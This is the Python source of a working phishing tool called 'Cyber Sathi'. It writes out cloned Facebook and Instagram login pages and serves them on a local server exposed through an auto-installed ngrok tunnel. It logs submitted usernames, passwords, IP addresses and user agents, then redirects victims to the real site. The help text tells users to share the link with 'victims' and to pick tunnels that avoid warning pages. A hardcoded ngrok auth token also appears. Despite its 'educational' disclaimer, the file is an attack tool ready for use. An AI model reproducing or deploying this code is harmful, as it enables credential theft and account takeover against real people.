"""
🔥 CYBER SATHI - Advanced Phishing Tool
With Auto Ngrok Installation & Auth Token Setup
"""

import os
import sys
import json
import time
import random
import string
import threading
import socket
import requests
import subprocess
import urllib.parse
import zipfile
import platform
import shutil
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# Configuration
VERSION = "2.8"
AUTHOR = "Cyber Sathi Team"
TEMPLATES_DIR = "templates"
DATA_DIR = "captured_data"
NGROK_DIR = "ngrok_tunnels"
NGROK_AUTH_TOKEN = "37sEgc5uswQR6z9Zp2K7q86wpv3_2qXDQW4fKSb632StQoX5s"  # YOUR TOIN HERE

# Colors for terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Create necessary directories
def setup_directories():
    """Create required directories"""
    directories = [TEMPLATES_DIR, DATA_DIR, NGROK_DIR]
    for directory in directories:
        if not os.path.exists(directory):
            os.makedirs(directory)
            print(f"{Colors.GREEN}[+] Created directory: {directory}{Colors.RESET}")

# Global variables
collected_data = []
current_server = None
is_running = False
selected_template = ""
ngrok_url = ""

def print_banner():
    """Print fancy banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   ██████╗██╗   ██╗██████╗ ███████╗██████╗                ║
║  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗               ║
║  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝               ║
║  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗               ║
║  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║               ║
║   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝               ║
║                                                          ║
║      ███████╗ █████╗ ████████╗██╗  ██╗██╗                ║
║      ██╔════╝██╔══██╗╚══██╔══╝██║  ██║██║                ║
║      ███████╗███████║   ██║   ███████║██║                ║
║      ╚════██║██╔══██║   ██║   ██╔══██║██║                ║
║      ███████║██║  ██║   ██║   ██║  ██║██║                ║
║      ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝               ║
║                                                          ║
║    ╔════════════════════════════════════════════════╗    ║
║    ║      ADVANCED PHISHING TOOL v{VERSION}        ║    ║
║    ║      Auto Ngrok Install & Auth Setup ✓        ║    ║
║    ╚════════════════════════════════════════════════╝    ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.GREEN}✓ Ngrok Auto-Install ✓ Auth Token Pre-configured ✓{Colors.RESET}
{Colors.YELLOW}⚠  FOR EDUCATIONAL PURPOSE ONLY{Colors.RESET}
{Colors.YELLOW}⚠  Use only on systems you own or have permission!{Colors.RESET}
{Colors.CYAN}{'='*65}{Colors.RESET}
"""
    print(banner)

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def install_ngrok_auto():
    """Automatically install ngrok if not found"""
    print(f"{Colors.YELLOW}[*] Checking ngrok installation...{Colors.RESET}")
    
    # First check if ngrok is already installed
    if check_ngrok():
        print(f"{Colors.GREEN}[✓] Ngrok is already installed{Colors.RESET}")
        return True
    
    print(f"{Colors.BLUE}[*] Ngrok not found. Starting automatic installation...{Colors.RESET}")
    
    try:
        # Determine OS
        system = platform.system().lower()
        is_windows = system == "windows"
        is_linux = system == "linux"
        is_mac = system == "darwin"
        
        # Download URL based on OS
        download_url = ""
        filename = ""
        
        if is_windows:
            download_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
            filename = "ngrok-windows.zip"
        elif is_mac:
            download_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip"
            filename = "ngrok-mac.zip"
        elif is_linux:
            # Check architecture
            arch = platform.machine()
            if 'arm' in arch.lower() or 'aarch' in arch.lower():
                download_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz"
                filename = "ngrok-linux-arm.tgz"
            else:
                download_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz"
                filename = "ngrok-linux.tgz"
        else:
            print(f"{Colors.RED}[!] Unsupported operating system: {system}{Colors.RESET}")
            return False
        
        print(f"{Colors.YELLOW}[*] Downloading ngrok for {system}...{Colors.RESET}")
        
        # Download ngrok
        response = requests.get(download_url, stream=True, timeout=30)
        if response.status_code != 200:
            print(f"{Colors.RED}[!] Download failed: {response.status_code}{Colors.RESET}")
            return False
        
        with open(filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        print(f"{Colors.YELLOW}[*] Extracting ngrok...{Colors.RESET}")
        
        # Extract based on file type
        if filename.endswith('.zip'):
            with zipfile.ZipFile(filename, 'r') as zip_ref:
                zip_ref.extractall(".")
        elif filename.endswith('.tgz'):
            import tarfile
            with tarfile.open(filename, 'r:gz') as tar_ref:
                tar_ref.extractall(".")
        
        # Make executable on non-Windows
        if not is_windows:
            if os.path.exists("ngrok"):
                os.chmod("ngrok", 0o755)
            elif os.path.exists("ngrok.exe"):
                os.rename("ngrok.exe", "ngrok")
                os.chmod("ngrok", 0o755)
        
        # Clean up
        if os.path.exists(filename):
            os.remove(filename)
        
        # Add to PATH (try)
        try:
            if is_windows:
                # Try to add to system PATH
                ngrok_path = os.path.abspath("ngrok.exe")
                if not os.path.exists(ngrok_path):
                    ngrok_path = os.path.abspath("ngrok")
                
                # Try to copy to system directory
                try:
                    system_dir = os.environ.get('SystemRoot', 'C:\\Windows')
                    system32 = os.path.join(system_dir, 'System32')
                    if os.path.exists(system32):
                        shutil.copy(ngrok_path, os.path.join(system32, 'ngrok.exe'))
                        print(f"{Colors.GREEN}[+] Copied ngrok to System32{Colors.RESET}")
                except:
                    pass
            else:
                # Linux/Mac - try to copy to /usr/local/bin
                try:
                    if os.path.exists('/usr/local/bin'):
                        shutil.copy('ngrok', '/usr/local/bin/ngrok')
                        os.chmod('/usr/local/bin/ngrok', 0o755)
                        print(f"{Colors.GREEN}[+] Installed ngrok to /usr/local/bin{Colors.RESET}")
                except:
                    # Fallback to user bin
                    user_bin = os.path.expanduser('~/.local/bin')
                    os.makedirs(user_bin, exist_ok=True)
                    shutil.copy('ngrok', os.path.join(user_bin, 'ngrok'))
                    os.chmod(os.path.join(user_bin, 'ngrok'), 0o755)
                    
                    # Add to PATH in bashrc/zshrc
                    shells = ['~/.bashrc', '~/.zshrc', '~/.bash_profile']
                    for shell_file in shells:
                        shell_path = os.path.expanduser(shell_file)
                        if os.path.exists(shell_path):
                            with open(shell_path, 'a') as f:
                                f.write(f'\nexport PATH="$PATH:{user_bin}"\n')
        
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Could not add to PATH: {e}{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Run ngrok from current directory{Colors.RESET}")
        
        print(f"{Colors.GREEN}[✓] Ngrok installed successfully!{Colors.RESET}")
        
        # Now setup auth token
        return setup_ngrok_auth()
        
    except Exception as e:
        print(f"{Colors.RED}[!] Ngrok installation failed: {e}{Colors.RESET}")
        return False

def setup_ngrok_auth():
    """Setup ngrok auth token automatically"""
    print(f"{Colors.YELLOW}[*] Setting up ngrok authentication...{Colors.RESET}")
    
    try:
        # Check if we can run ngrok
        ngrok_cmd = 'ngrok.exe' if platform.system() == 'Windows' else './ngrok'
        if not os.path.exists(ngrok_cmd):
            ngrok_cmd = 'ngrok'
        
        # Create ngrok config directory
        ngrok_config_dir = os.path.expanduser('~/.ngrok2')
        os.makedirs(ngrok_config_dir, exist_ok=True)
        
        # Create config file with auth token
        config_file = os.path.join(ngrok_config_dir, 'ngrok.yml')
        config_content = f"""authtoken: {NGROK_AUTH_TOKEN}
region: us
console_ui: true
"""
        
        with open(config_file, 'w') as f:
            f.write(config_content)
        
        # Also try to set via command line
        try:
            if os.path.exists(ngrok_cmd):
                result = subprocess.run(
                    [ngrok_cmd, 'config', 'add-authtoken', NGROK_AUTH_TOKEN],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[✓] Auth token set via command{Colors.RESET}")
        except:
            pass  # Silent fail, config file should work
        
        print(f"{Colors.GREEN}[✓] Ngrok authentication configured!{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Using token: {NGROK_AUTH_TOKEN[:10]}...{Colors.RESET}")
        return True
        
    except Exception as e:
        print(f"{Colors.RED}[!] Auth setup failed: {e}{Colors.RESET}")
        return False

def check_ngrok():
    """Check if ngrok is installed and working"""
    try:
        # Try different possible ngrok locations
        possible_paths = ['ngrok', 'ngrok.exe', './ngrok', './ngrok.exe']
        
        for ngrok_path in possible_paths:
            try:
                result = subprocess.run(
                    [ngrok_path, '--version'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[✓] Ngrok found: {ngrok_path}{Colors.RESET}")
                    return True
            except:
                continue
        
        return False
    except:
        return False

def start_ngrok_tunnel(port, subdomain=None):
    """Start ngrok tunnel with auto-install if needed"""
    global ngrok_url
    
    # First ensure ngrok is installed
    if not check_ngrok():
        print(f"{Colors.YELLOW}[*] Ngrok not found. Installing automatically...{Colors.RESET}")
        if not install_ngrok_auto():
            print(f"{Colors.RED}[!] Failed to install ngrok{Colors.RESET}")
            return None
    
    try:
        # Prepare command
        ngrok_cmd = 'ngrok.exe' if platform.system() == 'Windows' and os.path.exists('ngrok.exe') else 'ngrok'
        if not os.path.exists(ngrok_cmd):
            ngrok_cmd = './ngrok' if os.path.exists('./ngrok') else 'ngrok'
        
        cmd = [ngrok_cmd, 'http', str(port), '--region', 'us']
        if subdomain:
            cmd.extend(['--subdomain', subdomain])
        
        print(f"{Colors.BLUE}[*] Starting Ngrok tunnel...{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Using your auth token: {NGROK_AUTH_TOKEN[:10]}...{Colors.RESET}")
        
        # Start ngrok process
        ngrok_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        print(f"{Colors.YELLOW}[*] Waiting for tunnel to establish (15 seconds)...{Colors.RESET}")
        time.sleep(15)  # Give more time for tunnel
        
        # Get tunnel URL
        try:
            for attempt in range(5):
                try:
                    response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                    if response.status_code == 200:
                        tunnels = response.json().get('tunnels', [])
                        for tunnel in tunnels:
                            if tunnel.get('proto') == 'https':
                                ngrok_url = tunnel.get('public_url')
                                print(f"{Colors.GREEN}[+] Ngrok URL: {ngrok_url}{Colors.RESET}")
                                print(f"{Colors.YELLOW}[!] Note: Free tier may show 'Visit Site' page{Colors.RESET}")
                                
                                # Save tunnel info
                                tunnel_info = {
                                    'url': ngrok_url,
                                    'port': port,
                                    'time': datetime.now().isoformat(),
                                    'template': selected_template,
                                    'auth_token_used': NGROK_AUTH_TOKEN[:10] + '...'
                                }
                                
                                with open(f'{NGROK_DIR}/tunnel_{int(time.time())}.json', 'w') as f:
                                    json.dump(tunnel_info, f, indent=2)
                                
                                return ngrok_url
                    time.sleep(3)
                except:
                    continue
                    
        except Exception as e:
            print(f"{Colors.RED}[!] Could not get Ngrok URL: {e}{Colors.RESET}")
        
        print(f"{Colors.YELLOW}[*] Tunnel started but URL not captured{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Check ngrok console or http://localhost:4040{Colors.RESET}")
        return None
        
    except Exception as e:
        print(f"{Colors.RED}[!] Ngrok error: {e}{Colors.RESET}")
        return None

def setup_custom_domain():
    """Setup custom domain options"""
    print(f"\n{Colors.CYAN}[+] Domain Options:{Colors.RESET}")
    print(f"{Colors.WHITE}1. Use Ngrok (Auto-install + Your Auth Token) ✓")
    print(f"2. Use Ngrok with custom subdomain")
    print(f"3. Use local network only")
    print(f"4. Use custom domain with port forwarding{Colors.RESET}")
    
    choice = input(f"\n{Colors.YELLOW}[?] Select option (1-4): {Colors.RESET}")
    
    if choice == '1':
        print(f"{Colors.GREEN}[✓] Ngrok selected - Will auto-install if needed{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Using your auth token: {NGROK_AUTH_TOKEN[:10]}...{Colors.RESET}")
        return {'type': 'ngrok_random'}
    elif choice == '2':
        subdomain = input(f"{Colors.YELLOW}[?] Enter custom subdomain: {Colors.RESET}")
        return {'type': 'ngrok_subdomain', 'subdomain': subdomain}
    elif choice == '3':
        return {'type': 'local'}
    elif choice == '4':
        domain = input(f"{Colors.YELLOW}[?] Enter your domain (example.com): {Colors.RESET}")
        return {'type': 'custom_domain', 'domain': domain}
    else:
        return {'type': 'ngrok_random'}

def load_templates():
    """Load templates from templates directory"""
    templates = {}
    
    if not os.path.exists(TEMPLATES_DIR):
        print(f"{Colors.RED}[!] Templates directory not found!{Colors.RESET}")
        return templates
    
    for file in os.listdir(TEMPLATES_DIR):
        if file.endswith('.html'):
            template_name = file.replace('.html', '')
            template_path = os.path.join(TEMPLATES_DIR, file)
            
            try:
                with open(template_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                    templates[template_name] = content
                    print(f"{Colors.GREEN}[+] Loaded template: {template_name}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[!] Error loading {file}: {e}{Colors.RESET}")
    
    if not templates:
        create_default_templates()
        templates = load_templates()
    
    return templates

def create_default_templates():
    """Create default templates"""
    print(f"{Colors.YELLOW}[*] Creating default templates...{Colors.RESET}")
    
    # Facebook template
    facebook_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log in or Sign up</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { display: flex; max-width: 1000px; gap: 50px; padding: 20px; }
        .left-section { flex: 1; padding-top: 100px; }
        .logo { color: #1877f2; font-size: 60px; font-weight: bold; }
        .tagline { font-size: 28px; margin-top: 10px; }
        .right-section { flex: 1; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 14px 16px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
        .login-btn { background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; padding: 14px; width: 100%; cursor: pointer; }
        .login-btn:hover { background: #166fe5; }
        .forgot-link { text-align: center; display: block; margin: 15px 0; color: #1877f2; text-decoration: none; }
        .create-btn { background: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; padding: 14px; margin: 20px auto; display: block; width: 60%; }
        .create-btn:hover { background: #36a420; }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <div class="logo">facebook</div>
            <div class="tagline">Facebook helps you connect and share with the people in your life.</div>
        </div>
        <div class="right-section">
            <div class="login-box">
                <form method="POST">
                    <input type="text" name="email" placeholder="Email address or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <a href="#" class="forgot-link">Forgotten password?</a>
                <hr style="margin: 20px 0; border: 0.5px solid #dadde1;">
                <button class="create-btn">Create New Account</button>
            </div>
        </div>
    </div>
</body>
</html>'''
    
    # Instagram template
    instagram_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        @import url('https://fonts.cdnfonts.com/css/billabong');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { display: flex; gap: 50px; max-width: 900px; padding: 20px; }
        .phones { flex: 1; }
        .phones img { width: 100%; max-width: 380px; }
        .login-box { flex: 1; }
        .login-form { background: white; border: 1px solid #dbdbdb; padding: 40px; text-align: center; }
        .logo { font-family: 'Billabong', cursive; font-size: 60px; margin-bottom: 30px; }
        input { width: 100%; padding: 12px; margin: 6px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; }
        .login-btn { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; margin-top: 15px; cursor: pointer; }
        .login-btn:hover { opacity: 0.9; }
        .divider { display: flex; align-items: center; margin: 20px 0; }
        .line { flex: 1; height: 1px; background: #dbdbdb; }
        .or { padding: 0 15px; color: #8e8e8e; font-size: 13px; font-weight: bold; }
        .fb-login { color: #385185; font-weight: bold; text-decoration: none; display: block; margin: 15px 0; }
        .forgot-link { color: #00376b; text-decoration: none; font-size: 12px; }
        .signup-box { background: white; border: 1px solid #dbdbdb; padding: 25px; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="phones">
            <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png" alt="Instagram">
        </div>
        <div class="login-box">
            <div class="login-form">
                <div class="logo">Instagram</div>
                <form method="POST">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <div class="divider">
                    <div class="line"></div>
                    <div class="or">OR</div>
                    <div class="line"></div>
                </div>
                <a href="#" class="fb-login">Log in with Facebook</a>
                <a href="#" class="forgot-link">Forgot password?</a>
            </div>
            <div class="signup-box">
                Don't have an account? <a href="#" style="color: #0095f6; text-decoration: none; font-weight: bold;">Sign up</a>
            </div>
        </div>
    </div>
</body>
</html>'''
    
    templates = {
        'facebook': facebook_html,
        'instagram': instagram_html,
        'google': instagram_html  # Using instagram template for Google
    }
    
    for filename, content in templates.items():
        filepath = os.path.join(TEMPLATES_DIR, f"{filename}.html")
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
    
    print(f"{Colors.GREEN}[+] Created default templates{Colors.RESET}")

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global selected_template
        
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            templates = load_templates()
            if selected_template in templates:
                self.wfile.write(templates[selected_template].encode('utf-8'))
            else:
                self.wfile.write(b'<h1>Template not found</h1>')
        
        elif self.path == '/success':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            success_page = '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Success</title>
                <style>
                    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background: #f0f2f5; }
                    .success-box { background: white; padding: 50px; border-radius: 10px; display: inline-block; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    .check { color: #42b72a; font-size: 80px; }
                    h1 { color: #1c1e21; margin: 20px 0; }
                    p { color: #65676b; font-size: 18px; }
                </style>
            </head>
            <body>
                <div class="success-box">
                    <div class="check">✓</div>
                    <h1>Login Successful!</h1>
                    <p>You are being redirected to your account...</p>
                </div>
                <script>
                    setTimeout(function() {
                        window.location.href = "https://facebook.com";
                    }, 3000);
                </script>
            </body>
            </html>
            '''
            self.wfile.write(success_page.encode('utf-8'))
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        global collected_data
        
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            
            parsed_data = urllib.parse.parse_qs(post_data)
            
            credentials = {}
            for key in ['email', 'username', 'password', 'phone', 'login', 'query']:
                if key in parsed_data:
                    credentials[key] = parsed_data[key][0]
            
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            entry = {
                'timestamp': timestamp,
                'ip': client_ip,
                'user_agent': user_agent,
                'template': selected_template,
                'credentials': credentials
            }
            
            collected_data.append(entry)
            
            log_file = os.path.join(DATA_DIR, 'captured_data.json')
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(json.dumps(entry, ensure_ascii=False) + '\n')
            
            print(f"{Colors.GREEN}[+] Captured from {client_ip}: {credentials}{Colors.RESET}")
            
            self.send_response(302)
            self.send_header('Location', '/success')
            self.end_headers()
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error in POST handler: {e}{Colors.RESET}")
            self.send_response(500)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

def start_phishing_server(template_name, port=8080, domain_config=None):
    """Start phishing server with selected template"""
    global current_server, is_running, selected_template, ngrok_url
    
    selected_template = template_name
    is_running = True
    
    server_address = ('0.0.0.0', port)
    current_server = HTTPServer(server_address, PhishingHandler)
    
    print(f"{Colors.GREEN}[+] Starting {template_name} phishing server...{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Port: {port}{Colors.RESET}")
    
    local_ip = get_local_ip()
    print(f"{Colors.GREEN}[+] Local URL: http://{local_ip}:{port}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] Local URL: http://localhost:{port}{Colors.RESET}")
    
    if domain_config:
        if domain_config['type'] == 'ngrok_random':
            print(f"\n{Colors.CYAN}[+] SETTING UP NGROK:{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Your auth token: {NGROK_AUTH_TOKEN[:10]}...{Colors.RESET}")
            ngrok_url = start_ngrok_tunnel(port)
            if ngrok_url:
                print(f"\n{Colors.GREEN}{'='*65}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] SHARE THIS URL: {ngrok_url}{Colors.RESET}")
                print(f"{Colors.GREEN}{'='*65}{Colors.RESET}")
        elif domain_config['type'] == 'ngrok_subdomain':
            ngrok_url = start_ngrok_tunnel(port, domain_config.get('subdomain'))
        elif domain_config['type'] == 'custom_domain':
            print(f"{Colors.YELLOW}[*] Setup your domain to point to: {local_ip}:{port}{Colors.RESET}")
    
    print(f"\n{Colors.CYAN}[+] Server is running!{Colors.RESET}")
    print(f"{Colors.CYAN}[+] Press Ctrl+C to stop server{Colors.RESET}")
    print(f"{Colors.CYAN}[+] Monitoring for credentials...{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*65}{Colors.RESET}")
    
    server_thread = threading.Thread(target=current_server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    
    try:
        while is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Stopping server...{Colors.RESET}")
    finally:
        is_running = False
        if current_server:
            current_server.shutdown()
        
        show_captured_data()

def show_captured_data():
    """Display captured data"""
    global collected_data
    
    print(f"\n{Colors.CYAN}{'='*65}{Colors.RESET}")
    print(f"{Colors.GREEN}[+] CAPTURED DATA:{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*65}{Colors.RESET}")
    
    if not collected_data:
        print(f"{Colors.YELLOW}[!] No data captured yet{Colors.RESET}")
        return
    
    for i, entry in enumerate(collected_data, 1):
        print(f"\n{Colors.YELLOW}[{i}] {entry['timestamp']}{Colors.RESET}")
        print(f"   Template: {entry['template']}")
        print(f"   IP: {entry['ip']}")
        print(f"   Credentials: {entry['credentials']}")
    
    summary_file = os.path.join(DATA_DIR, f'summary_{int(time.time())}.txt')
    with open(summary_file, 'w', encoding='utf-8') as f:
        f.write(f"Cyber Sathi - Captured Data Summary\n")
        f.write(f"Generated: {datetime.now()}\n")
        f.write(f"Total entries: {len(collected_data)}\n")
        f.write("="*50 + "\n\n")
        
        for entry in collected_data:
            f.write(f"Time: {entry['timestamp']}\n")
            f.write(f"IP: {entry['ip']}\n")
            f.write(f"Credentials: {entry['credentials']}\n")
            f.write("-"*30 + "\n")
    
    print(f"\n{Colors.GREEN}[+] Summary saved to: {summary_file}{Colors.RESET}")

def main_menu():
    """Main menu"""
    setup_directories()
    
    while True:
        print_banner()
        
        print(f"\n{Colors.CYAN}[+] MAIN MENU:{Colors.RESET}")
        print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Start Phishing Attack")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} View Templates")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Create New Template")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} View Captured Data")
        print(f"{Colors.GREEN}[5]{Colors.WHITE} Setup Domain/Tunnel")
        print(f"{Colors.GREEN}[6]{Colors.WHITE} Clear Data")
        print(f"{Colors.GREEN}[7]{Colors.WHITE} About & Help")
        print(f"{Colors.GREEN}[0]{Colors.WHITE} Exit")
        print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
        
        choice = input(f"\n{Colors.YELLOW}[?] Select option: {Colors.RESET}")
        
        if choice == '1':
            start_attack()
        elif choice == '2':
            view_templates()
        elif choice == '3':
            create_new_template()
            input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
        elif choice == '4':
            show_captured_data()
            input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
        elif choice == '5':
            domain_config = setup_custom_domain()
            print(f"{Colors.GREEN}[+] Domain configuration set{Colors.RESET}")
            time.sleep(2)
        elif choice == '6':
            global collected_data
            collected_data = []
            # Clear all data files
            for file in os.listdir(DATA_DIR):
                if file.endswith('.json') or file.endswith('.txt'):
                    os.remove(os.path.join(DATA_DIR, file))
            print(f"{Colors.GREEN}[+] All data cleared!{Colors.RESET}")
            time.sleep(1)
        elif choice == '7':
            show_help()
        elif choice == '0':
            print(f"\n{Colors.RED}[!] Exiting Cyber Sathi...{Colors.RESET}")
            break
        else:
            print(f"{Colors.RED}[!] Invalid option!{Colors.RESET}")
            time.sleep(1)

def start_attack():
    """Start phishing attack"""
    # Load templates
    templates = load_templates()
    
    if not templates:
        print(f"{Colors.RED}[!] No templates found!{Colors.RESET}")
        return
    
    print(f"\n{Colors.CYAN}[+] Available Templates:{Colors.RESET}")
    print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
    
    template_list = list(templates.keys())
    for i, template in enumerate(template_list, 1):
        print(f"{Colors.GREEN}[{i}]{Colors.WHITE} {template}")
    
    print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
    
    try:
        choice = int(input(f"\n{Colors.YELLOW}[?] Select template (1-{len(template_list)}): {Colors.RESET}"))
        if 1 <= choice <= len(template_list):
            selected = template_list[choice-1]
            
            # Get port
            port_input = input(f"{Colors.YELLOW}[?] Enter port (default 8080): {Colors.RESET}")
            port = int(port_input) if port_input.isdigit() else 8080
            
            # Domain setup
            print(f"\n{Colors.CYAN}[+] Domain Setup:{Colors.RESET}")
            domain_config = setup_custom_domain()
            
            # Start server
            start_phishing_server(selected, port, domain_config)
        else:
            print(f"{Colors.RED}[!] Invalid selection{Colors.RESET}")
    except ValueError:
        print(f"{Colors.RED}[!] Please enter a number{Colors.RESET}")

def view_templates():
    """View available templates"""
    templates = load_templates()
    
    print(f"\n{Colors.CYAN}[+] Available Templates:{Colors.RESET}")
    print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
    
    for i, (name, content) in enumerate(templates.items(), 1):
        size_kb = len(content) / 1024
        lines = content.count('\n')
        print(f"{Colors.GREEN}[{i}]{Colors.WHITE} {name} ({size_kb:.1f} KB, {lines} lines)")
    
    print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
    
    view = input(f"\n{Colors.YELLOW}[?] View template details? (y/n): {Colors.RESET}")
    if view.lower() == 'y':
        try:
            choice = int(input(f"{Colors.YELLOW}[?] Select template number: {Colors.RESET}"))
            template_list = list(templates.keys())
            if 1 <= choice <= len(template_list):
                selected = template_list[choice-1]
                print(f"\n{Colors.CYAN}[+] Template: {selected}{Colors.RESET}")
                print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
                content = templates[selected]
                print(content[:500] + "..." if len(content) > 500 else content)
        except:
            pass

def show_help():
    """Show help information"""
    print_banner()
    
    help_text = f"""
{Colors.CYAN}[+] CYBER SATHI HELP:{Colors.RESET}
{Colors.WHITE}{'='*55}{Colors.RESET}

{Colors.YELLOW}📖 HOW TO USE:{Colors.RESET}
1. Select 'Start Phishing Attack'
2. Choose a template
3. Setup domain/tunnel options
4. Share the generated URL
5. Monitor captured data

{Colors.YELLOW}🌐 DOMAIN OPTIONS:{Colors.RESET}
• Ngrok Random URL (Free): Shows 'Visit Site' page
• Ngrok Custom Subdomain (Pro): No warning page
• Serveo.net (Free): Recommended, no 'Visit Site' page
• Cloudflare Tunnel (Free): Best option, professional
• Local Network: Only in your network
• Custom Domain: Use your own domain

{Colors.YELLOW}🚫 NGROK "VISIT SITE" PAGE FIX:{Colors.RESET}
• Use Serveo.net (Option 3) - Completely free, no warnings
• Use Cloudflare Tunnel (Option 4) - Professional & free
• Buy Ngrok Pro plan - Remove warning page
• Accept that victims need to click 'Visit Site'

{Colors.YELLOW}📁 TEMPLATES:{Colors.RESET}
• Templates are stored in '{TEMPLATES_DIR}/' folder
• You can create custom HTML templates
• Default templates: Facebook, Instagram, Google

{Colors.YELLOW}💾 DATA:{Colors.RESET}
• Captured data saved in '{DATA_DIR}/' folder
• JSON format for detailed data
• Text summary also available

{Colors.RED}⚠  LEGAL DISCLAIMER:{Colors.RESET}
• This tool is for EDUCATIONAL purposes only
• Use only on systems you OWN or have PERMISSION to test
• Unauthorized access is ILLEGAL
• Developer is NOT responsible for misuse

{Colors.GREEN}🔧 REQUIREMENTS:{Colors.RESET}
• Python 3.x
